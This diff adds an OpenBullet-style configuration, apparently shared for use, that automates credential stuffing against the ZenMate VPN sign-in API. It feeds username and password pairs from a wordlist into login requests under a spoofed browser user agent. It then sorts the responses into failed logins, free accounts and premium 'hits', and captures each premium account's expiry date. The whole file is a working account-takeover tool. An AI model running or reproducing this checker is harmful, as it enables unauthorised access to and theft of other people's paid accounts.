@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "Api zenmate",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-16T20:20:18.4964025+00:00",
+  "AdditionalInfo": "3 bot",
+  "Author": "icebergblack2003",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "3",
+      "Id": 1827707908
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "4",
+      "Id": 797867221
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login REQUEST POST "https://api.zenguard.biz/v2/sign_in" AutoRedirect=TRUE 
+  CONTENT "install_id=dc01a8fe-6993-1b6f-a499-636270ac765f&show_premium=true&auth_method=user&auth_id=<USER>&auth_secret=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Bad Request" 
+    KEY "Invalid email or password" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"account_type\":\"FREE\"" 
+  KEYCHAIN Success OR 
+    KEY "\"account_type\":\"PREMIUM\"" 
+#Scadenza PARSE "<SOURCE>" LR "premium_expires_at\":\"" "\",\"" Recursive=FALSE -> CAP "Scadenza" "" "" 
